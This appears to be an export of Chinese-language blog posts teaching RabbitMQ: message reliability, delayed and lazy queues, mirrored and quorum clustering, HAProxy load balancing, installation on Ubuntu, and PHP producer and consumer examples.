            echo 'Message nacked with content ' . $message->body . PHP_EOL;
        }
    );
    
    $channel->set_return_listener(
        function ($replyCode, $replyText, $exchange, $routingKey, AMQPMessage $message) {
            echo 'Message returned with content ' . $message->body . PHP_EOL;
        }
    );
    ```

  - **消息持久化**

    ```php
    $channel = $connection->channel();
    /*
        name: $queue
        passive: false
        durable: true // the queue will survive server restarts
        exclusive: false // the queue can be accessed in other channels
        auto_delete: false //the queue won't be deleted once the channel is closed.
    */
    # 队列持久化
    $channel->queue_declare($queue, false, true, false, false);	
    /*
        name: $exchange
        type: direct
        passive: false
        durable: true // the exchange will survive server restarts
        auto_delete: false //the exchange won't be deleted once the channel is closed.
    */
    # 交换机持久化
    $channel->exchange_declare($exchange, AMQPExchangeType::DIRECT, false, true, false);
    # 消息持久化
    $message = new AMQPMessage(
        $messageBody, 
        array(
            'content_type' => 'text/plain', 
            'delivery_mode' => AMQPMessage::DELIVERY_MODE_PERSISTENT
        )
    );
    $channel->basic_publish($message, $exchange);
    ```

  - **消费者消息确认**

    ```php
    /**
     * @param \PhpAmqpLib\Message\AMQPMessage $message
     */
    function process_message($message)
    {
        echo "\n--------\n";
        echo $message->body;
        echo "\n--------\n";
    
        $message->ack();
    
        // Send a message with the string "quit" to cancel the consumer.
        if ($message->body === 'quit') {
            $message->getChannel()->basic_cancel($message->getConsumerTag());
        }
    }
    /*
        queue: Queue from where to get the messages
        consumer_tag: Consumer identifier
        no_local: Don't receive messages published by this consumer.
        no_ack: If set to true, automatic acknowledgement mode will be used by this consumer. See https://www.rabbitmq.com/confirms.html for details.
        exclusive: Request exclusive consumer access, meaning only this consumer can access the queue
        nowait:
        callback: A PHP Callback
    */
    
    $channel->basic_consume($queue, $consumerTag, false, false, false, false, 'process_message');
    ```

  - **消费失败重试机制**

    失败后返回nack, 尝试重试, 到达重试次数上限后, 投递入死信队列

    ```php
    $channel = $connection->channel();
    
    $channel->queue_declare('test11', false, true, false, false, false, 
       new AMQPTable(array(
           'x-dead-letter-exchange' => 't_test1',
           'x-message-ttl' => 15000,
           'x-expires' => 16000
    )));
    ```

- **消息补偿**

![image-20220712141419805](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3c45ff54231add9401d069629ee8f4ce-45917d2.png)

### 消息幂等性保障

**幂等性**指一次和多次请求某一个资源，对于资源本身应该具有同样的结果。也就是说，其任意多次执行对资源本身所产生的影响均与一次执行的影响相同。

在MQ中指消费多条相同的消息，得到与消费该消息一次相同的结果。

**乐观锁机制**: 

![image-20220712141500430](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b83355b02d9d8397b3ff543cca8d2747-78acf6e.png)

### 延迟消息问题

利用**TTL结合死信交换机**，实现消息发出后，消费者延迟收到消息的效果。这种消息模式就称为延迟队列（Delay Queue）模式。

因为延迟队列的需求非常多，所以RabbitMQ的官方也推出了一个插件，**原生支持延迟队列**效果。

这个插件就是**DelayExchange**插件。参考RabbitMQ的插件列表页面：https://www.rabbitmq.com/community-plugins.html

```php
$channel = $connection->channel();

$channel->exchange_declare('delayed_exchange', 'x-delayed-message', false, true, false, false, false, new AMQPTable(array(
   'x-delayed-type' => AMQPExchangeType::FANOUT
)));

$channel->queue_declare('delayed_queue', false, false, false, false, false, new AMQPTable(array(
   'x-dead-letter-exchange' => 'delayed'
)));

$headers = new AMQPTable(array('x-delay' => 7000));
$message = new AMQPMessage('hello', array('delivery_mode' => 2));
$message->set('application_headers', $headers);
$channel->basic_publish($message, 'delayed_exchange');
```

### 消息堆积问题

- **队列上绑定多个消费者，提高消费速度**

- **使用惰性队列，可以在mq中保存更多消息**

  从RabbitMQ的3.6.0版本开始，就增加了**Lazy Queues**的概念，也就是惰性队列。惰性队列的特征如下：

  - 接收到消息后直接存入磁盘而非内存
  - 消费者要消费消息时才会从磁盘中读取并加载到内存
  - 支持数百万条的消息存储

  ```
  文档: https://www.rabbitmq.com/lazy-queues.html
  ```

  **基于命令行设置lazy-queue:**

  要设置一个队列为惰性队列，只需要在声明队列时，指定`x-queue-mode`属性为`lazy`即可。可以通过命令行将一个运行中的队列修改为惰性队列：

  ```shell
  rabbitmqctl set_policy Lazy "^lazy-queue$" '{"queue-mode":"lazy"}' --apply-to queues  
  ```

  ```
  命令解读：
  - rabbitmqctl ：RabbitMQ的命令行工具
  - set_policy ：添加一个策略
  - Lazy ：策略名称，可以自定义
  - "^lazy-queue$" ：用正则表达式匹配队列的名字
  - '{"queue-mode":"lazy"}' ：设置队列模式为lazy模式
  - --apply-to queues：策略的作用对象，是所有的队列
  
  ```

  > 优点: 基于磁盘存储，消息上限高, 没有间歇性的page-out，性能比较稳定
  >
  > 缺点: 基于磁盘存储，消息时效性会降低, 性能受限于磁盘的IO

### 高可用问题

RabbitMQ的集群有两种模式：

- **普通集群**：是一种分布式集群，将队列分散到集群的各个节点，从而提高整个集群的并发能力。

  普通集群，或者叫标准集群（classic cluster），具备下列特征：

  - 会在集群的各个节点间共享部分数据，包括：交换机、队列元信息。不包含队列中的消息。
  - 当访问集群某节点时，如果队列不在该节点，会从数据所在节点传递到当前节点并返回
  - 队列所在节点宕机，队列中的消息就会丢失

- **镜像集群**：是一种主从集群，普通集群的基础上，添加了主从备份功能，提高集群的数据可用性。

  镜像集群：本质是主从模式，具备下面的特征：

  - 交换机、队列、队列中的消息会在各个mq的镜像节点之间同步备份。
  - 创建队列的节点被称为该队列的**主节点，**备份到的其它节点叫做该队列的**镜像**节点。
  - 一个队列的主节点可能是另一个队列的镜像节点
  - 所有操作都是主节点完成，然后同步给镜像节点
  - 主宕机后，镜像节点会替代成新的主

  镜像模式的配置有3种模式：

  | ha-mode         | ha-params         | 效果                                                         |
  | :-------------- | :---------------- | :----------------------------------------------------------- |
  | 准确模式exactly | 队列的副本量count | 集群中队列副本（主服务器和镜像服务器之和）的数量。count如果为1意味着单个副本：即队列主节点。count值为2表示2个副本：1个队列主和1个队列镜像。换句话说：count = 镜像数量 + 1。如果群集中的节点数少于count，则该队列将镜像到所有节点。如果有集群总数大于count+1，并且包含镜像的节点出现故障，则将在另一个节点上创建一个新的镜像。 |
  | all             | (none)            | 队列在群集中的所有节点之间进行镜像。队列将镜像到任何新加入的节点。镜像到所有节点将对所有群集节点施加额外的压力，包括网络I / O，磁盘I / O和磁盘空间使用情况。推荐使用exactly，设置副本数为（N / 2 +1）。 |
  | nodes           | *node names*      | 指定队列创建到哪些节点，如果指定的节点全部不存在，则会出现异常。如果指定的节点在集群中存在，但是暂时不可用，会创建节点到当前客户端连接到的节点。 |

  ```
  exactly模式
  rabbitmqctl set_policy ha-two "^two\." '{"ha-mode":"exactly","ha-params":2,"ha-sync-mode":"automatic"}'
  
  - rabbitmqctl set_policy：固定写法
  - ha-two：策略名称，自定义
  - "^two\."：匹配队列的正则表达式，符合命名规则的队列才生效，这里是任何以two.开头的队列名称
  - '{"ha-mode":"exactly","ha-params":2,"ha-sync-mode":"automatic"}': 策略内容
    - "ha-mode":"exactly"：策略模式，此处是exactly模式，指定副本数量
    - "ha-params":2：策略参数，这里是2，就是副本数量为2，1主1镜像
    - "ha-sync-mode":"automatic"：同步策略，默认是manual，即新加入的镜像节点不会同步旧的消息。如果设置为automatic，则新加入的镜像节点会把主节点中所有消息都同步，会带来额外的网络开销
  ```

  ```
  all模式
  rabbitmqctl set_policy ha-all "^all\." '{"ha-mode":"all"}'
  
  - ha-all：策略名称，自定义
  - "^all\."：匹配所有以all.开头的队列名
  - '{"ha-mode":"all"}'：策略内容
    - "ha-mode":"all"：策略模式，此处是all模式，即所有节点都为镜像节点
  ```

  ```
  nodes模式
  rabbitmqctl set_policy ha-nodes "^nodes\." '{"ha-mode":"nodes","ha-params":["rabbit@nodeA", "rabbit@nodeB"]}'
  
  - rabbitmqctl set_policy：固定写法
  - ha-nodes：策略名称，自定义
  - "^nodes\."：匹配队列的正则表达式，符合命名规则的队列才生效，这里是任何以nodes.开头的队列名称
  - '{"ha-mode":"nodes","ha-params":["rabbit@nodeA", "rabbit@nodeB"]}': 策略内容
    - "ha-mode":"nodes"：策略模式，此处是nodes模式
    - "ha-params":["rabbit@mq1", "rabbit@mq2"]：策略参数，这里指定副本所在节点名称
  ```

- 仲裁队列

  镜像集群虽然支持主从，但主从同步并不是强一致的，某些情况下可能有数据丢失的风险。因此在RabbitMQ的3.8版本以后，推出了新的功能：**仲裁队列**来代替镜像集群，底层采用Raft协议确保主从的数据一致性。

  具备下列特征：

  - 与镜像队列一样，都是主从模式，支持主从数据同步
  - 使用非常简单，没有复杂的配置
  - 主从同步基于Raft协议，强一致

  ![image-20210717234329640](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7d6e04572b1b9bfc1f6addd1cb62a7d0-4aecf36.png)



## 集群搭建

### 集群方案的原理

RabbitMQ这款消息队列中间件产品本身是基于**Erlang**编写，Erlang语言天生具备**分布式特性**（通过同步Erlang集群各节点的magic cookie来实现）。因此，RabbitMQ天然支持**Clustering**。这使得RabbitMQ本身不需要像ActiveMQ、Kafka那样通过ZooKeeper分别来实现HA方案和保存集群的元数据。集群是保证可靠性的一种方式，同时可以通过水平扩展以达到增加消息吞吐量能力的目的。

![1565245219265](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/c854d71fa251bc726017ce84e084361a-037f8a0.png)

### 单机多实例部署

```
官方文档: https://www.rabbitmq.com/clustering.html
```

```shell
# 停止rabbitmq服务
service rabbitmq-server stop
# 启动第一个节点：
RABBITMQ_NODE_PORT=5673 RABBITMQ_NODENAME=rabbit1 rabbitmq-server start
# 启动第二个节点：
RABBITMQ_NODE_PORT=5674 RABBITMQ_SERVER_START_ARGS="-rabbitmq_management listener [{port,15674}]" RABBITMQ_NODENAME=rabbit2 rabbitmq-server start

# rabbit1操作作为主节点
rabbitmqctl -n rabbit1 stop_app  
rabbitmqctl -n rabbit1 reset
rabbitmqctl -n rabbit1 start_app

# rabbit2操作为从节点：
rabbitmqctl -n rabbit2 stop_app
rabbitmqctl -n rabbit2 reset
rabbitmqctl -n rabbit2 join_cluster rabbit1@'ni9nes'	# ''内是主机名
rabbitmqctl -n rabbit2 start_app

# 查看集群状态：
rabbitmqctl cluster_status -n rabbit1
```

![image-20220712142716093](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a6e40a2fcfd52d71cc1847e12d69ed31-4005745.png)

![image-20220712142727735](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9af82d085fc89d81ec79630bf3009a16-d9d5a39.png)

### 集群管理

```
rabbitmqctl join_cluster {cluster_node} [–ram]
将节点加入指定集群中。在这个命令执行前需要停止RabbitMQ应用并重置节点。

rabbitmqctl cluster_status
显示集群的状态。

rabbitmqctl change_cluster_node_type {disc|ram}
修改集群节点的类型。在这个命令执行前需要停止RabbitMQ应用。

rabbitmqctl forget_cluster_node [–offline]
将节点从集群中删除，允许离线执行。

rabbitmqctl update_cluster_nodes {clusternode}
在集群中的节点应用启动前咨询clusternode节点的最新信息，并更新相应的集群信息。这个和join_cluster不同，它不加入集群。考虑这样一种情况，节点A和节点B都在集群中，当节点A离线了，节点C又和节点B组成了一个集群，然后节点B又离开了集群，当A醒来的时候，它会尝试联系节点B，但是这样会失败，因为节点B已经不在集群中了。
```

### RabbitMQ镜像集群配置

上面已经完成RabbitMQ默认集群模式，但并不保证队列的高可用性，尽管交换机、绑定这些可以复制到集群里的任何一个节点，但是**队列内容不会复制**。虽然该模式解决一项目组节点压力，但队列节点宕机直接导致该队列无法应用，只能等待重启，所以要想在队列节点宕机或故障也能正常应用，就要复制队列内容到集群里的每个节点，必须要创建**镜像队列**。

**镜像队列**是基于普通的集群模式的，然后再添加一些策略，所以你还是得先配置普通集群，然后才能设置镜像队列。设置的镜像队列可以通过开启的网页的管理端Admin->Policies，也可以通过命令。

```shell
sudo rabbitmqctl -n rabbit1@'ni9nes'  set_policy my_ha_proxy "^" '{"ha-mode":"all"}'
```

![image-20220712143050345](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/59e8a1416f4f6e516d10cf1e93639337-a0898ba.png)

```
- Name:策略名称
- Pattern：匹配的规则，如果是匹配所有的队列，是^.
- Definition:使用ha-mode模式中的all，也就是同步所有匹配的队列。问号链接帮助文档。
```

### 负载均衡-HAProxy

HAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案,包括Twitter，Reddit，StackOverflow，GitHub在内的多家知名互联网公司在使用。HAProxy实现了一种事件驱动、单一进程模型，此模型支持非常大的并发连接数。

#### 安装HAProxy

```shell
wget https://www.haproxy.org/download/1.6/src/haproxy-1.6.16.tar.gz
tar -zxvf haproxy-1.6.5.tar.gz -C /usr/local
# 进入目录、进行编译、安装
cd /usr/local/haproxy-1.6.5
make TARGET=custom PREFIX=/usr/local/haproxy
make install PREFIX=/usr/local/haproxy
mkdir /etc/haproxy
# 赋权
groupadd -r -g 149 haproxy
useradd -g haproxy -r -s /sbin/nologin -u 149 haproxy
# 创建haproxy配置文件
mkdir /etc/haproxy
vim /etc/haproxy/haproxy.cfg
```

```properties
#logging options
global
	log 127.0.0.1 local0 info
	maxconn 5120
	chroot /usr/local/haproxy
	uid 99
	gid 99
	daemon
	quiet
	nbproc 20
	pidfile /var/run/haproxy.pid

defaults
	log global
	mode tcp
	option tcplog
	option dontlognull
	retries 3
	option redispatch
	maxconn 2000
	contimeout 5s
    clitimeout 60s
    srvtimeout 15s	
#front-end IP for consumers and producters

listen rabbitmq_cluster
	bind 0.0.0.0:5672
	mode tcp
	#balance url_param userid
	#balance url_param session_id check_post 64
	#balance hdr(User-Agent)
	#balance hdr(host)
	#balance hdr(Host) use_domain_only
	#balance rdp-cookie
	#balance leastconn
	#balance source //ip
	balance roundrobin
        server node1 127.0.0.1:5673 check inter 5000 rise 2 fall 2
        server node2 127.0.0.1:5674 check inter 5000 rise 2 fall 2

listen stats
	bind 192.168.253.141:8100
	mode http
	option httplog
	stats enable
	stats uri /rabbitmq-stats
	stats refresh 5s
```

#### 启动HAproxy负载

```shell
/usr/local/haproxy/sbin/haproxy -f /etc/haproxy/haproxy.cfg
# 查看haproxy进程状态
ps -ef | grep haproxy

#访问如下地址对mq节点进行监控
#http://192.168.253.141:8100/rabbitmq-stats

# 代码中访问mq集群地址，则变为访问haproxy地址:5672
```

![image-20220712144941078](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6683399ac8c6558acee6d2a31651ed95-81738b6.png)

]]></content>
      <categories>
        <category>开发资料</category>
      </categories>
      <tags>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>RabbitMQ队列使用解析</title>
    <url>/2022/04/14/MQ/RabbitMQ/RabbitMQ%E9%98%9F%E5%88%97%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[
## MQ基本概念

### MQ概述

**消息队列(Message Queue)**, 是在消息的传输过程中保存消息的容器. 多用于分布式系统之间的通信

![image-20220709125842485](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/82f6bc0251bcc6d488b3637fe694539f-9a5215f.png)

发送方称为**生产者**，接收方称为**消费者** 

分布式系统通信两种方式：直接远程调用 和 借助第三方 完成间接通信

### MQ 的优势和劣势

#### MQ 的优势

- **应用解耦**

  系统的耦合性越高，容错性就越低，可维护性就越低。

  使用 MQ 使得应用间解耦，提升容错性和可维护性。

- **异步提速**

  提升用户体验和系统吞吐量（单位时间内处理请求的数目）。

  ![image-20220709130316032](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/6cd4495bbd9643344ffd6d82c3349bf3-b3eef98.png)

- **削峰填谷**

  ![image-20220709130427441](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/1b526643db3fde84ab2eb1e488fb70fe-109d20c.png)

  使用了 MQ 之后，限制消费消息的速度为1000，这样一来，高峰期产生的数据势必会被积压在 MQ 中，高峰就被“削”掉了.

  但是因为消息积压，在高峰期过后的一段时间内，消费消息的速度还是会维持在1000，直到消费完积压的消息，这就叫做“填谷”。

#### MQ 的劣势

![image-20220709130614372](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3238576d5c0748eff5019b39312c3c58-71d7fd9.png)

- **系统可用性降低**

  系统引入的外部依赖越多，系统稳定性越差。一旦 MQ 宕机，就会对业务造成影响。如何保证MQ的高可用？

-  **系统复杂度提高**

  MQ 的加入大大增加了系统的复杂度，以前系统间是同步的远程调用，现在是通过 MQ 进行异步调用。如何保证消息没有被重复消费？怎么处理消息丢失情况？那么保证消息传递的顺序性？

- **一致性问题**

  A 系统处理完业务，通过 MQ 给B、C、D三个系统发消息数据，如果 B 系统、C 系统处理成功，D 系统处理失败。如何保证消息数据处理的一致性？

### 使用 MQ 需要满足的条件

- 生产者不需要从消费者处获得反馈。引入消息队列之前的直接调用，其接口的返回值应该为空，这才让明明下层的动作还没做，上层却当成动作做完了继续往后走，即所谓异步成为了可能。
- 容许短暂的不一致性。
- 确实是用了有效果。即解耦、提速、削峰这些方面的收益，超过加入MQ，管理MQ这些成本。

### 常见的 MQ 产品

|                | RabbitMQ                                                     | ActiveMQ                                    | RocketMQ          | Kafka                                             |
| -------------- | ------------------------------------------------------------ | ------------------------------------------- | ----------------- | ------------------------------------------------- |
| 公司/社区      | Rabbit                                                       | Apache                                      | 阿里              | Apache                                            |
| 开发语言       | Erlang                                                       | Java                                        | Java              | Scala&Java                                        |
| 协议支持       | AMQP，XMPP，SMTP， STOMP                                     | OpenWire,STOMP， REST,XMPP,AMQP             | 自定义            | 自定义协议，社区封装了http协议支持                |
| 客户端支持语言 | 官方支持Erlang，Java，  Ruby等,社区产出多种API，几乎支持所有语言 | Java，C，C++，  Python，PHP，  Perl，.net等 | Java，C++（不成熟 | 官方支持Java,社区产出  多种API，如PHP，  Python等 |

## RabbitMQ 简介

```
官网: https://www.rabbitmq.com
```

### AMQP协议

**AMQP**，即 **Advanced Message Queuing Protocol**（高级消息队列协议），是一个**网络协议**，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。2006年，AMQP 规范发布。类比HTTP。

### 基础架构

2007年，Rabbit 技术公司基于 AMQP 标准开发的 RabbitMQ 1.0 发布。RabbitMQ 采用 Erlang 语言开发。
Erlang 语言由 Ericson 设计，专门为开发高并发和分布式系统的一种语言，在电信领域使用广泛。

RabbitMQ 基础架构如下图：

![image-20220709131308174](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2a0607fd9dcbac10144d5239456f3984-5caed21.png)

```
相关概念：
- Broker：接收和分发消息的应用，RabbitMQ Server就是 Message Broker

- Virtual host：出于多租户和安全因素设计的，把 AMQP 的基本组件划分到一个虚拟的分组中，类似于网络中的 namespace 概念。当多个不同的用户使用同一个 RabbitMQ server 提供的服务时，可以划分出多个vhost，每个用户在自己的 vhost 创建 exchange／queue 等

- Connection：publisher／consumer 和 broker 之间的 TCP 连接

- Channel：如果每一次访问 RabbitMQ 都建立一个 Connection，在消息量大的时候建立 TCP Connection的开销将是巨大的，效率也较低。Channel 是在 connection 内部建立的逻辑连接，如果应用程序支持多线程，通常每个thread创建单独的 channel 进行通讯，AMQP method 包含了channel id 帮助客户端和message broker 识别 channel，所以 channel 之间是完全隔离的。Channel 作为轻量级的 Connection极大减少了操作系统建立 TCP connection 的开销

- Exchange：message 到达 broker 的第一站，根据分发规则，匹配查询表中的 routing key，分发消息到queue 中去。常用的类型有：direct (point-to-point), topic (publish-subscribe) and fanout (multicast)

- Queue：消息最终被送到这里等待 consumer 取走

- Binding：exchange 和 queue 之间的虚拟连接，binding 中可以包含 routing key。Binding 信息被保存到 exchange 中的查询表中，用于 message 的分发依据
```

### 工作模式

RabbitMQ 提供了 **6 种工作模式**：

简单模式、work queues、Publish/Subscribe 发布与订阅模式、Routing路由模式、Topics 主题模式、RPC 远程调用模式（远程调用，不太算 MQ；暂不作介绍）。

```
官网对应模式介绍：https://www.rabbitmq.com/getstarted.html
```

![image-20220709131840455](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/01df483bbae06cb709199ff2d468af26-8d59613.png)



## RabbitMQ 的安装和配置

### ubuntu 18.04安装

```shell
#!/usr/bin/sh

sudo apt-get install curl gnupg apt-transport-https -y

## Team RabbitMQ's main signing key
curl -1sLf "https://keys.openpgp.org/vks/v1/by-fingerprint/0A9AF2115F4687BD29803A206B73A36E6026DFCA" | sudo gpg --dearmor | sudo tee /usr/share/keyrings/com.rabbitmq.team.gpg > /dev/null
## Launchpad PPA that provides modern Erlang releases
curl -1sLf "https://keyserver.ubuntu.com/pks/lookup?op=get&search=0xf77f1eda57ebb1cc" | sudo gpg --dearmor | sudo tee /usr/share/keyrings/net.launchpad.ppa.rabbitmq.erlang.gpg > /dev/null
## PackageCloud RabbitMQ repository
curl -1sLf "https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey" | sudo gpg --dearmor | sudo tee /usr/share/keyrings/io.packagecloud.rabbitmq.gpg > /dev/null

## Add apt repositories maintained by Team RabbitMQ
sudo tee /etc/apt/sources.list.d/rabbitmq.list <<EOF
## Provides modern Erlang/OTP releases
##
## "bionic" as distribution name should work for any reasonably recent Ubuntu or Debian release.
## See the release to distribution mapping table in RabbitMQ doc guides to learn more.
deb [signed-by=/usr/share/keyrings/net.launchpad.ppa.rabbitmq.erlang.gpg] http://ppa.launchpad.net/rabbitmq/rabbitmq-erlang/ubuntu bionic main
deb-src [signed-by=/usr/share/keyrings/net.launchpad.ppa.rabbitmq.erlang.gpg] http://ppa.launchpad.net/rabbitmq/rabbitmq-erlang/ubuntu bionic main

## Provides RabbitMQ
##
## "bionic" as distribution name should work for any reasonably recent Ubuntu or Debian release.
## See the release to distribution mapping table in RabbitMQ doc guides to learn more.
deb [signed-by=/usr/share/keyrings/io.packagecloud.rabbitmq.gpg] https://packagecloud.io/rabbitmq/rabbitmq-server/ubuntu/ bionic main
deb-src [signed-by=/usr/share/keyrings/io.packagecloud.rabbitmq.gpg] https://packagecloud.io/rabbitmq/rabbitmq-server/ubuntu/ bionic main
EOF

## Update package indices
sudo apt-get update -y

## Install Erlang packages
sudo apt-get install -y erlang-base \
                        erlang-asn1 erlang-crypto erlang-eldap erlang-ftp erlang-inets \
                        erlang-mnesia erlang-os-mon erlang-parsetools erlang-public-key \
                        erlang-runtime-tools erlang-snmp erlang-ssl \
                        erlang-syntax-tools erlang-tftp erlang-tools erlang-xmerl

## Install rabbitmq-server and its dependencies
sudo apt-get install rabbitmq-server -y --fix-missing
```

下面是应该与  RabbitMQ apt 存储库一起使用的操作系统版本和分发名称表

| Release         | Distribution |
| :-------------- | :----------- |
| Ubuntu 20.04    | `focal`      |
| Ubuntu 18.04    | `bionic`     |
| Debian Buster   | `buster`     |
| Debian Bullseye | `bullseye`   |
| Debian Sid      | `bullseye`   |

### 开启管理界面及配置

```shell
# 开启管理界面
$ sudo rabbitmq-plugins enable rabbitmq_management
# 修改默认配置信息
$ sudo vim /usr/lib/rabbitmq/lib/rabbitmq_server-3.6.5/ebin/rabbit.app 
$ sudo vim /usr/lib/rabbitmq/lib/rabbitmq_server-3.10.5/plugins/rabbit-3.10.5/ebin/rabbit.app
# 比如修改密码、配置等等，例如：loopback_users 中的 <<"guest">>,只保留guest
```

### 控制

```shell
service rabbitmq-server start # 启动服务
service rabbitmq-server stop # 停止服务
service rabbitmq-server restart # 重启服务
```

### 配置文件

```shell
$ cp /usr/share/doc/rabbitmq-server-3.6.5/rabbitmq.config.example /etc/rabbitmq/rabbitmq.config
```

### 登陆管理页面

> 默认账密: guest   guest

![image-20220709152518724](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/0055dd70094261151ff5f1d589465c43-891eb72.png)



## RabbitMQ 快速入门

### window_wamp开发环境搭建

- **下载扩展**

    ```
    https://pecl.php.net/package/amqp
    ```

- **移动扩展文件**

    ```
    复制文件 php_amqp.dll + php_amqp.pdb 到 D:\wamp64\bin\php\php7.3.21\ext\
    复制文件 rabbitmq.4.dll + rabbitmq.4.pdb  到 D:\wamp64\bin\php\php7.3.21
    ```

- **修改配置文件**

    ```
    D:\wamp64\bin\php\php7.3.21\phpForApache.ini
    添加行 : extension=php_amqp.dll

    D:\wamp64\bin\apache\apache2.4.46\conf\httpd.conf
    添加行: LoadFile "D:/wamp64/bin/php/php7.3.21/rabbitmq.4.dll"
    ```

- **重启服务**

  ![image-20220709154449199](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/28f7bbce14ccb147ce51f34991196f77-296e196.png)

### 测试用例

```
官方文档: 使用php-amqplib/php-amqplib
https://www.rabbitmq.com/tutorials/tutorial-one-php.html
https://github.com/php-amqplib/php-amqplib/tree/master/demo
```

```php
<?php
# producer.php
$conn_args = [
    'host' => '192.168.253.141',
    'port' => 5672,
    'login' => 'ni9ne',
    'password' => 'ni9ne',
    'vhost' => '/ni9ne'
];

$conn = new AMQPConnection($conn_args);
try {
    if (!$conn->connect()) die('failed to connect to AMQP');
} catch (AMQPConnectionException $e) {
    die($e->getMessage());
}

$exchange_name = 'e_ni9ne';
// $queue_name = 'q_ni9ne';
$route_key = 'key_1';

$channel = new AMQPChannel($conn);
// 创建交换机
$exchange = new AMQPExchange($channel);
$exchange->setName($exchange_name);
date_default_timezone_set('Asia/Shanghai');

for ($i = 0; $i < 100; $i ++){
    usleep(100);
    $msg = "This is A Message From Producer!" . date("H:i:s");
    $result = $exchange->publish($msg, $route_key);
    print("Publish Message: ". $result. '; time: ' . $i);
    print('<br/>');
}

$conn->disconnect();
```

```php
<?php
# consumer.php
$conn_args = [
    'host' => '192.168.253.141',
    'port' => 5672,
    'login' => 'ni9ne',
    'password' => 'ni9ne',
    'vhost' => '/ni9ne'
];

$conn = new AMQPConnection($conn_args);

try {
    if (!$conn->connect()) die('failed to connect to AMQP');
} catch (AMQPConnectionException $e) {
    die($e->getMessage());
}

$exchange_name = 'e_ni9ne';
$queue_name = 'q_ni9ne';
$route_key = 'key_1';

$channel = new AMQPChannel($conn);

// 创建交换机
$exchange = new AMQPExchange($channel);
$exchange->setName($exchange_name);
$exchange->setType(AMQP_EX_TYPE_DIRECT);
$exchange->setFlags(AMQP_DURABLE);
print("Exchange Status: " . $exchange->declareExchange());
print('<br/>');


// 创建队列
$queue = new AMQPQueue($channel);
$queue->setName($queue_name);
$queue->setFlags(AMQP_DURABLE);
print("Queue Message Total: " . $queue->declareQueue());
print('<br/>');


// 绑定交换机与队列, 并指定路由键
$bind = $queue->bind($exchange_name, $route_key);
print("Queue Bind: ". $bind);
print('<br/>');


// 阻塞模式接收消息处理
print("Messages: ");

$queue->consume('handleMessage');
# 自动应答
# $queue->consume('handleMessage',AMQP_AUTOACK);
$conn->disconnect();

function handleMessage(AMQPEnvelope $envelope, AMQPQueue $queue){
    $msg = $envelope->getBody();
    print($msg);
    print('<br/>');
    file_put_contents('msg.txt', "消息体: " . $msg . PHP_EOL, FILE_APPEND);
    $queue->ack($envelope->getDeliveryTag());
}
```

![image-20220712082828313](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9ba931c87cbe89f6f1994aa9c96ab6d4-5ac1583.png)

## RabbitMQ 的工作模式

### Work queues 工作队列模式

![image-20220712095617691](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7f8e82711d5de1b66d72caa295d0aba3-ece6edd.png)

支持多个消费者, 共同消费同一个队列中的消息。对于任务过重或任务较多情况使用工作队列可以提高任务处理的速度。

在一个队列中如果有多个消费者，那么消费者之间对于同一个消息的关系是竞争的关系。

```php
<?php
# worker.php 生产者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->queue_declare('task_queue', false, true, false, false);

echo " [*] Waiting for messages. To exit press CTRL+C\n";

$callback = function ($msg) {
    echo ' [x] Received ', $msg->body, "\n";
    sleep(substr_count($msg->body, '.'));
    echo " [x] Done\n";
    $msg->ack();
};

$channel->basic_qos(null, 1, null);
$channel->basic_consume('task_queue', '', false, false, false, false, $callback);

while ($channel->is_open()) {
    $channel->wait();
}

$channel->close();
$connection->close();
```

```php
<?php
# new_task.php 消费者
require_once __DIR__ . '/vendor/autoload.php';
use PhpAmqpLib\Connection\AMQPStreamConnection;
use PhpAmqpLib\Message\AMQPMessage;

$connection = new AMQPStreamConnection('localhost', 5672, 'guest', 'guest');
$channel = $connection->channel();

$channel->queue_declare('task_queue', false, true, false, false);

$data = implode(' ', array_slice($argv, 1));
if (empty($data)) {
    $data = "Hello World!";
}
$msg = new AMQPMessage(
    $data,
    array('delivery_mode' => AMQPMessage::DELIVERY_MODE_PERSISTENT)
);

$channel->basic_publish($msg, '', 'task_queue');

echo ' [x] Sent ', $data, "\n";

$channel->close();
$connection->close();
```

### Pub/Sub 订阅模式

![image-20220712100007813](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e9ddec7d4142c85ef543ccd566b8ccb2-2d5c9eb.png)

在订阅模型中，多了一个 Exchange 角色，而且过程略有变化：

- P：生产者，也就是要发送消息的程序，但是不再发送到队列中，而是发给X（交换机）

- C：消费者，消息的接收者，会一直等待消息到来

- Queue：消息队列，接收消息、缓存消息

- Exchange：交换机（X）。一方面，接收生产者发送的消息。另一方面，指导如何处理消息，例如递交给某个特别队列、递交给所有队列、或是将消息丢弃。如何操作，取决于Exchange的类型。

**Exchange有常见以下3种类型**：

- **Fanout**：广播，将消息交给所有绑定到交换机的队列
- **Direct**：定向，把消息交给符合指定routing key 的队列
